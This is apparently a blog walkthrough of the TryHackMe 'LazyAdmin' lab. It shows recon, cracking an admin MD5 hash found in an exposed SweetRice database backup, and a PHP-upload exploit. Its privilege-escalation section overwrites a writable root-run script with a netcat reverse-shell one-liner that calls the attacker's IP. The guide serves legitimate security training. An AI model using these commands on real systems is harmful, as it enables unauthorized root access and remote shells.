<!DOCTYPE html>
<html class="direction--ltr theme--dark" lang=" en"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>TryHackMe - LazyAdmin | Akymos.io</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="TryHackMe - LazyAdmin" />
<meta name="author" content="akymos" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Room info Name: LazyAdmin Link: https://tryhackme.com/room/lazyadmin Subscription: Free Difficulty: Easy Description: Easy linux machine to practice your skills" />
<meta property="og:description" content="Room info Name: LazyAdmin Link: https://tryhackme.com/room/lazyadmin Subscription: Free Difficulty: Easy Description: Easy linux machine to practice your skills" />
<link rel="canonical" href="https://akymos.io/ctf/2023/04/23/ctf-lazyadmin.html" />
<meta property="og:url" content="https://akymos.io/ctf/2023/04/23/ctf-lazyadmin.html" />
<meta property="og:site_name" content="Akymos.io" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-04-23T17:24:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="TryHackMe - LazyAdmin" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"akymos"},"dateModified":"2023-04-23T17:24:00+00:00","datePublished":"2023-04-23T17:24:00+00:00","description":"Room info Name: LazyAdmin Link: https://tryhackme.com/room/lazyadmin Subscription: Free Difficulty: Easy Description: Easy linux machine to practice your skills","headline":"TryHackMe - LazyAdmin","mainEntityOfPage":{"@type":"WebPage","@id":"https://akymos.io/ctf/2023/04/23/ctf-lazyadmin.html"},"url":"https://akymos.io/ctf/2023/04/23/ctf-lazyadmin.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://akymos.io/feed.xml" title="Akymos.io" /><!-- Magnific Popup core CSS file -->
    <link rel="stylesheet" href="/assets/css/magnific-popup.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js" integrity="sha512-jGR1T3dQerLCSm/IGEGbndPwzszJBlKQ5Br9vuB0Pw2iyxOy+7AK+lJcCC8eaXyz/9du+bkCy4HXxByhxkHf+w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="/assets/js/jquery.magnific-popup.min.js"></script>
</head><body><div class="site-header">
    <div class="wrapper">
        <a class="site-title" rel="author" href="/">Akymos.io<b
                class="command_prompt"></b><b class="blinking_cursor">_</b></a>
        <span class="social_links">
            <a class="color-red-hover" href="https://tryhackme.com/p/akymos" style="vertical-align: middle;">
                <svg class="try-hack-me-logo" style="width: 27px;" role="img" viewBox="0 0 27 27"
                    xmlns="http://www.w3.org/2000/svg">
                    <path
                        d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"
                        >
                    </path>
                </svg>
            </a>
            
            
            <a class="color-blue-hover" href="https://linkedin.com/in/matteocusinato"><i class="fab fa-linkedin"></i></a>
            
            
            
            <a class="color-purple-hover" href="https://github.com/akymos"><i class="fab fa-github-square"></i></a>
            
            
        </span>
    </div>
</div><main class="page-content" aria-label="Content">
        <div class="wrapper">
            
<div class="author-box"><img src="https://github.com/akymos.png" class="author-avatar" alt="Avatar" /><div class="description">
    </div>
</div>

<div class="post">
    <h1 class="post-title">TryHackMe - LazyAdmin</h1>
    
    <div class="post-tags">
        
        <a class="tag" href="/tag/ctf/index.html">ctf</a>
        
        <a class="tag" href="/tag/tryhackme/index.html">TryHackMe</a>
        
    </div>
    
    <div class="post-date">
        Published on 23 Apr 2023
        
        by akymos
        
    </div>
    <ul id="toc" class="section-nav">
<li class="toc-entry toc-h1"><a href="#room-info">Room info</a>
<ul>
<li class="toc-entry toc-h2"><a href="#questions">Questions</a></li>
</ul>
</li>
<li class="toc-entry toc-h1"><a href="#step-0---recon">Step 0 - Recon</a>
<ul>
<li class="toc-entry toc-h2"><a href="#nmap">Nmap</a></li>
<li class="toc-entry toc-h2"><a href="#gobuster">Gobuster</a></li>
<li class="toc-entry toc-h2"><a href="#gobuster-on-content">Gobuster on /content</a></li>
<li class="toc-entry toc-h2"><a href="#john-the-ripper">John the Ripper</a></li>
<li class="toc-entry toc-h2"><a href="#exploit">Exploit</a></li>
</ul>
</li>
<li class="toc-entry toc-h1"><a href="#question-1---what-is-the-user-flag">Question 1 - What is the user flag?</a></li>
<li class="toc-entry toc-h1"><a href="#question-2---what-is-the-root-flag">Question 2 - What is the root flag?</a>
<ul>
<li class="toc-entry toc-h2"><a href="#privilege-escalation">Privilege escalation</a></li>
<li class="toc-entry toc-h2"><a href="#roottxt">Root.txt</a></li>
</ul>
</li>
</ul>
    
    <h1 id="room-info">
  
  
    <a href="#room-info">#</a> Room info
  
  
</h1>
    
<ul>
  <li><strong>Name</strong>: LazyAdmin</li>
  <li><strong>Link</strong>: <a href="https://tryhackme.com/room/lazyadmin" target="_blank">https://tryhackme.com/room/lazyadmin</a></li>
  <li><strong>Subscription</strong>: Free</li>
  <li><strong>Difficulty</strong>: Easy</li>
  <li><strong>Description</strong>: Easy linux machine to practice your skills</li>
</ul>
<h2 id="questions">
  
  
    <a href="#questions">#</a> Questions
  
  
</h2>
    
<ol>
  <li>What is the user flag?</li>
  <li>What is the root flag?</li>
</ol>
<h1 id="step-0---recon">
  
  
    <a href="#step-0---recon">#</a> Step 0 - Recon
  
  
</h1>
    
<h2 id="nmap">
  
  
    <a href="#nmap">#</a> Nmap
  
  
</h2>
    
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.26.136
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-24 21:28 CEST
Nmap scan report <span class="k">for </span>10.10.26.136
Host is up <span class="o">(</span>0.082s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 <span class="o">(</span>RSA<span class="o">)</span>
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 61846227c6c32917dd27459e29cb905e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>28.88 seconds
</code></pre></div></div>
<p>Nice, port 80 is open, but nothing interesting on it, only the default Apache page.
<img src="/assets/images/ctf-lazyadmin/01.png" alt="LazyAdmin - Apache default page" class="post-image" /></p>
<h2 id="gobuster">
  
  
    <a href="#gobuster">#</a> Gobuster
  
  
</h2>
    
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> 10.10.26.136 <span class="nt">-q</span>
/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/content              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/]
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 11321]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
</code></pre></div></div>
<p>We have a ‘strange’ directory: <code class="language-plaintext highlighter-rouge">/content</code>. Let’s check it out.
<img src="/assets/images/ctf-lazyadmin/02.png" alt="LazyAdmin - /content directory" class="post-image" /></p>
<h2 id="gobuster-on-content">
  
  
    <a href="#gobuster-on-content">#</a> Gobuster on /content
  
  
</h2>
    
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> 10.10.26.136/content <span class="nt">-q</span>
/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/_themes              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 322] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/_themes/]
/as                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/as/]
/attachment           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 325] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/attachment/]
/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 321] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/images/]
/inc                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/inc/]
/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2198]
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/js/]
</code></pre></div></div>
<p>Directory index is enabled. <code class="language-plaintext highlighter-rouge">/as</code> contains the admin panel of the website, but we don’t have any credentials (YET).
The directory <code class="language-plaintext highlighter-rouge">/inc</code> contains another folder: <code class="language-plaintext highlighter-rouge">/inc/mysql_backup</code>. Inside it, we have a file called <code class="language-plaintext highlighter-rouge">mysql_bakup_20191129023059-1.5.1.sql</code>. Let’s download it and check it out.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">return</span> <span class="k">array</span> <span class="p">(</span>
  <span class="mi">0</span> <span class="o">=&gt;</span> <span class="s1">'DROP TABLE IF EXISTS `%--%_attachment`;'</span><span class="p">,</span>
<span class="mf">......</span>
  <span class="mi">14</span> <span class="o">=&gt;</span> <span class="s1">'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&amp;#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"&lt;p&gt;Welcome to SweetRice - Thank your for install SweetRice as your website management system.&lt;/p&gt;&lt;h1&gt;This site is building now , please come late.&lt;/h1&gt;&lt;p&gt;If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting &lt;/p&gt;&lt;p&gt;and uncheck the checkbox \\"Site close\\" to open your website.&lt;/p&gt;&lt;p&gt;More help at &lt;a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\"&gt;Tip for Basic CMS SweetRice installed&lt;/a&gt;&lt;/p&gt;\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');'</span><span class="p">,</span>
<span class="mf">......</span>
<span class="p">)</span> <span class="no">ENGINE</span><span class="o">=</span><span class="nc">MyISAM</span> <span class="k">DEFAULT</span> <span class="no">CHARSET</span><span class="o">=</span><span class="n">utf8</span><span class="p">;</span><span class="err">'</span><span class="p">,</span>
<span class="p">);</span><span class="cp">?&gt;</span>
</code></pre></div></div>
<p>We have found the credentials for the admin panel: <code class="language-plaintext highlighter-rouge">manager:42f749ade7f9e195bf475f37a44cafcb</code> (MD5 hash).</p>
<h2 id="john-the-ripper">
  
  
    <a href="#john-the-ripper">#</a> John the Ripper
  
  
</h2>
    
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo </span>42f749ade7f9e195bf475f37a44cafcb <span class="o">&gt;</span> hash.txt <span class="o">&amp;&amp;</span> john <span class="nt">--format</span><span class="o">=</span>RAW-MD5 <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>2
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="k">***********</span>      <span class="o">(</span>?<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2023-04-24 21:59<span class="o">)</span> 100.0g/s 3379Kp/s 3379Kc/s 3379KC/s coco21..redlips
Use the <span class="s2">"--show --format=Raw-MD5"</span> options to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>
<p>So the admin account is:</p>
<ul>
  <li>Username: <code class="language-plaintext highlighter-rouge">manager</code></li>
  <li>Password: <code class="language-plaintext highlighter-rouge">***********</code>
<img src="/assets/images/ctf-lazyadmin/03.png" alt="LazyAdmin - Admin panel" class="post-image" /></li>
</ul>
<h2 id="exploit">
  
  
    <a href="#exploit">#</a> Exploit
  
  
</h2>
    
<p>In this version of SweetRice, there is a vulnerability that allows us to use a PHP shell. We can use it to get a reverse shell.
<a href="https://www.exploit-db.com/exploits/40700" target="_blank">https://www.exploit-db.com/exploits/40700</a></p>
<h1 id="question-1---what-is-the-user-flag">
  
  
    <a href="#question-1---what-is-the-user-flag">#</a> Question 1 - What is the user flag?
  
  
</h1>
    
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9001
listening on <span class="o">[</span>any] 9001 ...
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
<span class="nv">$ </span><span class="nb">cat</span> /home/itguy/user.txt
THM<span class="o">{</span><span class="k">***************************</span><span class="o">}</span>
</code></pre></div></div>
<p>The user flag is: <code class="language-plaintext highlighter-rouge">THM{***************************}</code></p>
<h1 id="question-2---what-is-the-root-flag">
  
  
    <a href="#question-2---what-is-the-root-flag">#</a> Question 2 - What is the root flag?
  
  
</h1>
    
<h2 id="privilege-escalation">
  
  
    <a href="#privilege-escalation">#</a> Privilege escalation
  
  
</h2>
    
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span> 
Matching Defaults entries <span class="k">for </span>www-data on THM-Chal:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User www-data may run the following commands on THM-Chal:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
<span class="nv">$ </span><span class="nb">cat</span> /home/itguy/backup.pl
<span class="c">#!/usr/bin/perl</span>

system<span class="o">(</span><span class="s2">"sh"</span>, <span class="s2">"/etc/copy.sh"</span><span class="o">)</span><span class="p">;</span>

<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lha</span> /etc/copy.sh
<span class="nt">-rw-r--rwx</span> 1 root root 81 Nov 29  2019 /etc/copy.sh
<span class="nv">$ </span><span class="nb">cat</span> /etc/copy.sh
<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 192.168.0.190 5554 <span class="o">&gt;</span>/tmp/f

<span class="nv">$ </span><span class="c"># We can modify the file /etc/copy.sh</span>
<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.32.129 9002 &gt;/tmp/f"</span> <span class="o">&gt;</span> /etc/copy.sh
<span class="nv">$ </span><span class="nb">cat</span> /etc/copy.sh
<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.8.32.129 9002 <span class="o">&gt;</span>/tmp/f

<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/perl /home/itguy/backup.pl
</code></pre></div></div>
<h2 id="roottxt">
  
  
    <a href="#roottxt">#</a> Root.txt
  
  
</h2>
    
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9002
